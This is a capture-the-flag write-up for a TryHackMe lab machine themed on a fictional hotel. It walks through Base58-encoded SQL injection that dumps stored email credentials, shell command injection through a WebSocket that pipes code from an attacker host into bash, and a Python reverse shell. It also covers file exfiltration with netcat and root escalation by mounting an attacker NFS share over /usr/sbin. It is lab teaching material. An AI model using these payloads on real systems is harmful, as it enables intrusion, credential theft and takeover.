# [DX2: Hell's Kitchen](https://tryhackme.com/room/dx2hellskitchen)

## Can you help compromise a civilian machine that we believe is connected to the NSF?

# Investigate the server of an associate

We need to recover the lost Ambrosia shipment from the NSF (National Secessionist Forces), the only treatment for the plague known as the Grey Death. However, we haven't located their main base of operations.

What we do know is some of the key figures in the organisation, and their associates: Jojo Fine, a punk who runs drugs through Hell's Kitchen, has been identified as a lieutenant in the NSF, and has one Sandra Renton, the daughter of a local hotelier for the 'Ton Hotel on his payroll.

Investigate the websites of the 'Ton Hotel and see if you can find anything that leads us to the NSF.

### What is the Web Flag?

_Don't forget to read everything!_

1. Perform a full port scan to enumerate all open services on the target machine.

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE VERSION
80/tcp   open  http
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.0 200 OK
|     content-length: 859
|     date: Sat, 23 May 2026 19:31:26 GMT
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8">
|     <title>Welcome to the 'Ton!</title>
|     <link rel="stylesheet" href="static/style.css"></link>
|     </head>
|     <body>
|     <div class="main">
|     <img src="static/hotel-logo.webp" alt="The 'Ton Hotel" />
|     <h1>Welcome to the 'Ton!</h1>
|     <h2>Fine Hotel Rooms, Hell's Kitchen, New York</h2>
|     <button id="booking" disabled>Book your Room</button>
|     <button onclick="window.location.href='/guest-book'">Guest Book</button>
|     <button onclick="window.location.href='/about-us'">About Us</button>
|     <img src="static/TonOutside.webp" alt="View from the Street" width="800px" />
|     </div>
|     <div class="footer">Copyright @ 2052</div>
|     <script src="static/check-roo
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     content-length: 0
|     date: Sat, 23 May 2026 19:31:26 GMT
|   NULL:
|     HTTP/1.1 408 Request Timeout
|     content-length: 0
|     connection: close
|     date: Sat, 23 May 2026 19:31:26 GMT
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     content-length: 0
|     connection: close
|_    date: Sat, 23 May 2026 19:31:26 GMT
|_http-title: Welcome to the 'Ton!
4346/tcp open  elanlm?
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 408 Request Timeout
|     content-length: 0
|     connection: close
|     date: Sat, 23 May 2026 19:31:31 GMT
|   GetRequest:
|     HTTP/1.0 200 OK
|     content-length: 10909
|     date: Sat, 23 May 2026 19:31:31 GMT
|   NULL:
|     HTTP/1.1 408 Request Timeout
|     content-length: 0
|     connection: close
|_    date: Sat, 23 May 2026 19:31:26 GMT
```

2. Viewing the source of `http://<TARGET_IP>/` reveals a partially-loaded script tag pointing to `http://<TARGET_IP>/static/check-rooms.js`:

```js
fetch("/api/rooms-available")
  .then((response) => response.text())
  .then((number) => {
    const bookingBtn = document.querySelector("#booking");
    bookingBtn.removeAttribute("disabled");
    if (number < 6) {
      bookingBtn.addEventListener("click", () => {
        window.location.href = "new-booking";
      });
    } else {
      bookingBtn.addEventListener("click", () => {
        alert(
          "Unfortunately the hotel is currently fully booked. Please try again later!",
        );
      });
    }
  });
```

> The **Book your Room** button is disabled by default and only enabled client-side. If rooms are available it redirects to `/new-booking`. This endpoint is worth exploring directly regardless of availability.

3. Viewing the source of `http://<TARGET_IP>/new-booking` reveals another client-side script, `new-booking.js`, which reads a `BOOKING_KEY` cookie and passes it to an API endpoint to pre-fill the booking form:

```js
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(";").shift();
}

fetch("/api/booking-info?booking_key=" + getCookie("BOOKING_KEY"))
  .then((response) => response.json())
  .then((data) => {
    document.querySelector("#rooms").value = data.room_num;
    document.querySelector("#nights").value = data.days;
  });
```

4. Decoding `BOOKING_KEY` value from Base58 reveals the underlying format is `booking_id:<ID>`. We can query the API directly with this key:

```bash
curl http://<TARGET_IP>/api/booking-info?booking_key=55oYpt6n8TAVgZajV45q11sp9
```

**Response:**

```
not found
```

5. Test for SQL injection by encoding `booking_id:1'` in Base58 and sending it. A `bad request` response instead of `not found` indicates the single quote broke the SQL query syntax:

```bash
curl http://<TARGET_IP>/api/booking-info?booking_key=2rjq1RU44241vVrrz
```

6. Determine the number of columns by using a UNION SELECT statement. Encoding `booking_id:1' UNION SELECT 1,2 -- -` in Base58:

```bash
curl http://<TARGET_IP>/api/booking-info?booking_key=ApfkkDrFctMBrXvW3fJPqtgiyDhrqKLGAWqaQpgwBY91n3Pa
```

**Response:**

```json
{ "room_num": "1", "days": "2" }
```

7. Enumerate the database schema and extract stored credentials:

Retrieve table definitions:

```
booking_id:1' UNION SELECT 1,sql FROM sqlite_schema -- -
Response:
{"room_num":"1","days":"CREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)"}
```

List all user-created tables:

```
booking_id:1' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -
Response:
{"room_num":"1","days":"email_access,reservations,bookings_temp"}
```

Inspect the `email_access` table structure:

```
booking_id:1' UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='email_access' -- -
Response:
{"room_num":"1","days":"CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)"}
```

Dump all credentials from the `email_access` table:

```
booking_id:1' UNION SELECT group_concat(email_username),group_concat(email_password) FROM email_access -- -
Response:
{"room_num":"NEVER LOGGED IN,NEVER LOGGED IN,NEVER LOGGED IN,pdenton,NEVER LOGGED IN,NEVER LOGGED IN","days":",,,4321chameleon,,"}
```

8. Use the discovered credentials to log into the webmail application running on port 4346. Navigate to `http://<TARGET_IP>:4346/` and sign in.

9. The first flag is in the email from `JReyes`.

<img width="1067" height="516" alt="SCREEN01" src="https://github.com/user-attachments/assets/d55e6b36-135e-49ed-a1c2-ab60c328bee0" />

---

### What is the User Flag?

_Sometimes almost all ways out are closed..._

1. Viewing the source of `http://<TARGET_IP>:4346/mail`, a WebSocket-based clock script is appended at the bottom of the page. The client connects to `/ws`, sends the browser's timezone string every second, and displays the server's response as the current time:

```js
let elems = document.querySelectorAll(".email_list .row");
for (var i = 0; i < elems.length; i++) {
  (elems[i].addEventListener("click", (e) => {
    (document
      .querySelector(".email_list .selected")
      .classList.remove("selected"),
      e.target.parentElement.classList.add("selected"));
    let t = e.target.parentElement.getAttribute("data-id"),
      n = e.target.parentElement.querySelector(".col_from").innerText,
      r = e.target.parentElement.querySelector(".col_subject").innerText;
    ((document.querySelector("#from_header").innerText = n),
      (document.querySelector("#subj_header").innerText = r),
      (document.querySelector("#email_content").innerText = ""),
      fetch("/api/message?message_id=" + t)
        .then((e) => e.text())
        .then((e) => {
          document.querySelector("#email_content").innerText = atob(e);
        }));
  }),
    document
      .querySelector(".dialog_controls button")
      .addEventListener("click", (e) => {
        (e.preventDefault(), (window.location.href = "/"));
      }));
}
const wsUri = `ws://${location.host}/ws`;
socket = new WebSocket(wsUri);
let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
((socket.onmessage = (e) =>
  (document.querySelector(".time").innerText = e.data)),
  setInterval(() => socket.send(tz), 1e3));
```

2. Intercept the WebSocket traffic using Burp Suite's **WebSockets history** tab. The outgoing frame contains only the timezone string. Appending a command wrapped in semicolons (`UTC;<COMMAND>;`) injects arbitrary shell commands into the server-side execution.

<img width="1600" height="616" alt="SCREEN02" src="https://github.com/user-attachments/assets/7e4493e3-391e-4705-a777-0121901d7e6e" />

3. On the attacker machine, create `index.html` containing a Python reverse shell one-liner that will connect back on port 443:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

> Port 443 is used here because outbound traffic on non-standard ports may be filtered by the host firewall.

4. Start a Python HTTP server on the attacker machine to serve the reverse shell payload:

```bash
python3 -m http.server 80
```

5. Start a Netcat listener on the attacker machine to catch the incoming reverse shell connection:

```bash
nc -lvnp 443
```

6. Send the WebSocket payload to fetch and execute the reverse shell from the attacker machine:

```
UTC;curl <ATTACKER_IP>|bash;
```

> The server fetches `http://<ATTACKER_IP>/index.html` and pipes it directly to bash, executing the reverse shell. The Netcat listener receives the connection.

7. In the web server's working directory, a task list left for hotel staff leaks a password:

```bash
cat hotel-jobs.txt
```

**Results:**

```
hotel tasks, q1 52

- fix lights in the elevator shaft, flickering for a while now
- maybe put barrier up in front of shaft, so the addicts dont fall in
- ask sandra AGAIN why that punk has an account on here (be nice, so good for her to be home helping with admin)
- remember! 'ilovemydaughter'

buy her something special maybe - she used to like raspberry candy - as thanks for locking the machine down. 'ports are blocked' whatever that means. my smart girl
```

8. A second file in the same directory hints at a hidden message left somewhere on the web server:

```bash
cat dad.txt
```

**Results:**

```
left you a note by the site -S
```

9. Stabilise the shell before continuing to make it fully interactive:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo;fg;
```

10. Read the hidden note Sandra left for her father, which contains her login password:

```bash
cat /srv/.dad
```

**Results:**

```
i cant deal with your attacks on my friends rn dad, i need to take some time away from the hotel. if you need access to the ton site, my pw is where id rather be: anywherebuthere. -S
```

11. Switch to Sandra's account using her password:

```bash
su sandra
# Password: anywherebuthere
```

12. Read the user flag:

```bash
cat /home/sandra/user.txt
```

<img width="379" height="198" alt="SCREEN03" src="https://github.com/user-attachments/assets/7dea9ffd-ac53-4934-b976-f64e7def0b3c" />

---

### What is the Root Flag?

_...if you can get out, what can you use?_

1. Browsing Sandra's home directory reveals a `Pictures` folder containing a file named `boss.jpg`. Set up a Netcat listener on the attacker machine to receive the file:

```bash
nc -lvnp 80 > boss.jpg
```

2. On the target, send the image file to the attacker:

```bash
cd /home/sandra/Pictures
nc <ATTACKER_IP> 80 < boss.jpg
```

> Open `boss.jpg` on the attacker machine. The password **kingofhellskitchen** is written directly on the image — this is Jojo Fine's password.

3. Switch to the `jojo` user and check his sudo privileges:

```bash
su jojo
sudo -l
# Password: kingofhellskitchen
```

**Results:**

```
User jojo may run the following commands on tonhotel:
    (root) /usr/sbin/mount.nfs
```

> `jojo` can run `/usr/sbin/mount.nfs` as root with no password prompt. The goal is to abuse this by mounting an attacker-controlled NFS share over a critical system directory, then planting a malicious binary there that will be executed as root. Because the host firewall blocks non-standard inbound ports, we configure the NFS server to listen on port 443.

4. On the **attacker machine**, create the NFS export directory and configure permissive ownership so the NFS server accepts writes from root-squashed clients:

```bash
mkdir /tmp/share
sudo chown nobody:nogroup /tmp/share
sudo chmod 777 /tmp/share
```

5. Edit `/etc/nfs.conf` on the **attacker machine** to force the NFS daemon onto port 443, bypassing the firewall that blocks standard NFS ports:

```conf
[nfsd]
port=443
```

6. Add the export entry to `/etc/exports` on the **attacker machine**, sharing `/tmp/share` to the target's subnet:

```bash
sudo bash -c 'echo "/tmp/share 10.0.0.0/8(rw)" >> /etc/exports'
```

7. Apply the export configuration and restart the NFS server on the **attacker machine**:

```bash
sudo exportfs -a
sudo systemctl restart nfs-kernel-server
```

8. Back on the **target machine** as `jojo`, use the allowed `sudo mount.nfs` command to mount the attacker's NFS share over the target's `/usr/sbin` directory. The `-o port=443` option directs the NFS client to connect on port 443:

```bash
sudo /usr/sbin/mount.nfs -o port=443 <ATTACKER_IP>:/tmp/share /usr/sbin
```

9. Copy `/bin/sh` into the NFS-mounted `/usr/sbin` under the name `mount.nfs`. NFS root-squash maps root to `nobody`, but since the share is world-writable the write succeeds:

```bash
cp /bin/sh /usr/sbin/mount.nfs
```

10. Execute the planted binary via `sudo`. The sudoers entry permits `jojo` to run `/usr/sbin/mount`.nfs as root spawning a root shell:

```bash
sudo /usr/sbin/mount.nfs
```

11. Read the root flag:

```bash
cat /root/root.txt
```

<img width="728" height="185" alt="SCREEN04" src="https://github.com/user-attachments/assets/a39be1fb-a16d-401f-b3f9-23f59324d237" />
